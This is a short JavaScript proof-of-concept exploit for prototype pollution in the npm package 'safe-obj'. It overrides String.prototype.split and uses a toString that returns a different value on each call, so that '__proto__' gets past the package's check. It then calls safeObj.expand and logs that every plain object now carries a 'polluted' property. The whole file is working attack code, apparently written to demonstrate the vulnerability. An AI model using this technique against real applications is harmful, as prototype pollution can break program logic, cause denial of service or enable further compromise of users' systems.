var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
var safeObj = require('safe-obj');
obj = {};
console.log({}.polluted);
safeObj.expand(obj, '__proto__.polluted', 'yes');
console.log({}.polluted);